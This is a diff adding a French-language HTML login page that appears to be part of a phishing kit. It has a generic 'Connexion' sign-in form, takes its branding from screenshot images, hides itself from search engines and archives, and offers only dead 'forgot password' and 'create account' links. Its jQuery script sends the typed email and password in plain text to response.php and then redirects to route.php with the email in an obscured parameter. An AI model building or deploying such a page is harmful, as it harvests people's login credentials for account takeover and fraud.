@@ -1,0 +1,152 @@
+<html lang="en"><head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1">
+    <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <link rel="shortcut icon" type="image/png" href="img/icon.png">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>Connexion</title>
+    <style>
+        .error {
+            /* Hidden by default */
+            display: none;
+            position: fixed;
+            /* Stay in place */
+            z-index: 1;
+            /* Sit on top */
+            padding-top: 100px;
+            /* Location of the box */
+            left: 0;
+            top: 0;
+            width: 100%;
+            /* Full width */
+            height: 100%;
+            /* Full height */
+            background-color: blue;
+            /* Fallback color */
+            background-color: rgba(0, 0, 0, 0.4);
+            /* Black w/ opacity */
+        }
+
+        nav {
+            box-shadow: 0 2px 4px 0 rgba(12, 43, 218, 0.15);
+            ;
+        }
+    </style>
+</head>
+
+<body style="padding-top: 50px;">
+    <nav class="navbar navbar-expand-sm fixed-top" style="background-color:#fff;padding-top: 15px;padding-bottom: 15px; justify-content: center;">
+
+        <div class="col-md-4 d-none d-sm-block " style="text-align: center;"><img src="img/cap2.PNG"></div>
+        <div class="col-md-4 d-block d-sm-none" style="text-align: center;"><img src="img/cap9.PNG"></div>
+    </nav>
+    <div class="col-md-12 col-12">
+        <div class="card  col-md-4 col-12 mx-auto" style=" z-index: 1; padding: 20px 25px 20px 25px;margin-top: 50px;box-shadow: rgba(0, 0, 0, 0.2) 0px 1px 5px 0px, rgba(0, 0, 0, 0.04) 0px 3px 1px -2px, rgba(0, 0, 0, 0.04) 0px 2px 2px 0px; margin-top: 50px;margin-bottom: 50px;">
+
+            <div class="card-body" style="">
+                <h4 class="card-title text-center">Bonjour !</h4>
+                <p style="font-size: 13px;; text-align: center;">Connectez-vous pour découvrir toutes nos
+                    fonctionnalités.</p>
+                <form>
+                    <div class="form-group">
+                        <label for="email" style="margin-bottom: -10px;font-weight: 600;">E-mail</label>
+                        <input type="email" name="email" id="email" class="form-control-lg col-12 email" placeholder="" aria-describedby="helpId" style="outline: none; border: 1px solid rgb(202, 209, 217);">
+                        <small id="helpId" class="text-muted errormail" style="text-align: left; display: none;">
+                            <p style="color: red;">Veuillez saisir une adresse email.</p>
+                        </small>
+                    </div>
+
+                    <div class=" form-group " style="margin-top: 40px;; ">
+                        <label for="password " style="margin-bottom: -10px;font-weight: 600; ">Mot de Passe</label>
+                        <input type="password" name="pasword " id="password " class="form-control-lg col-12 password" placeholder=" " aria-describedby="helpId " style="outline: none; border: 1px solid rgb(202, 209, 217); ">
+                        <small id="helpId " class="text-muted errorpassword" style="text-align: left; display: none;">
+                            <p style="color: red;">Votre mot de passe doit comprendre 1 caractères ou plus.</p>
+                        </small>
+                    </div>
+                    <div>
+                        <span style="font-size: 15px; font-weight: 600; "><a href="# ">Mot de passe oublié</a></span>
+                    </div>
+                    <div style="margin-top: 30px;; ">
+                        <button class="btn btn-sm col-12 connection " style="font-weight: 600; background-color: #336699;padding: 11px; color: #fff; ">Se
+                            connecter</button>
+                    </div>
+                </form>
+                <div style="text-align: center; margin-top: 40px; ">
+                    <p style="font-size: 15px; font-weight: 600; ">Envie de nous rejoindre ? <a href=" ">Créer un
+                            compte</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="col-md-12 d-none d-sm-block " style="position: absolute; bottom: -50px; text-align: center; ">
+        <img src="img/cap1.png ">
+    </footer>
+
+    <script type="text/javascript ">
+        $(document).ready(function() {
+
+            function validateEmail($email) {
+                var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
+                return emailReg.test($email);
+            }
+            $('.connection').on('click', function(e) {
+                e.preventDefault()
+                if (!validateEmail($('.email').val()) || $('.email').val() == '') {
+                    $('.errormail').css({
+                        'display': 'block'
+                    })
+                    $('.email').css({
+                        'border-color': 'red'
+                    })
+                } else {
+                    $('.errormail').css({
+                        'display': 'none'
+                    })
+                    $('.email').css({
+                        'border-color': ' rgb(202, 209, 217)'
+                    })
+                }
+                if ($('.password').val().length < 4) {
+                    $('.errorpassword').css({
+                        'display': 'block'
+                    })
+                    $('.password').css({
+                        'border-color': 'red'
+                    })
+                } else {
+                    $('.errorpassword').css({
+                        'display': 'none'
+                    })
+                    $('.password').css({
+                        'border-color': ' rgb(202, 209, 217)'
+                    })
+                }
+                if (validateEmail($('.email').val()) && $('.password').val().length > 6) {
+                    $.ajax({
+                        url: 'response.php',
+                        type: 'POST',
+                        data: 'email=' + $('.email').val() + '&password=' + $('.password').val(),
+                        success: function(code_html, statut) { // success est toujours en place, bien sûr !
+
+                            window.location.href = "route.php?ffe6865454eegehzefgezfez587srhs=" + $('.email').val();
+
+                        }, // success est toujours en place, bien sûr ! 
+                    })
+
+                }
+            })
+        })
+    </script>
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js " integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN " crossorigin="anonymous "></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js " integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV " crossorigin="anonymous "></script>
+
+
+
+</body></html>
